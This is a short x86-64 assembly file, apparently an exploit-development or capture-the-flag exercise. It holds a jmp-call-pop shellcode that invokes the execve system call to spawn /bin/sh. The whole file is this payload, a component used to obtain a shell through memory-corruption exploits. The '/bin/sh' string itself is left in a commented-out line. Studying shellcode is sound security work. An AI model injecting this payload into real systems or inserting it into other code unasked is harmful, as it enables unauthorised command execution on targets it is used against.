.intel_syntax noprefix
.globl _start
_start:
    jmp loadstring
execve:
    xor rax,rax
    pop rdi
    push rax
    pop rsi
    push rax
    pop rdx
    mov al,0x3b
    syscall
    ret
loadstring:
    call execve
    ## .asciz "/bin/sh"
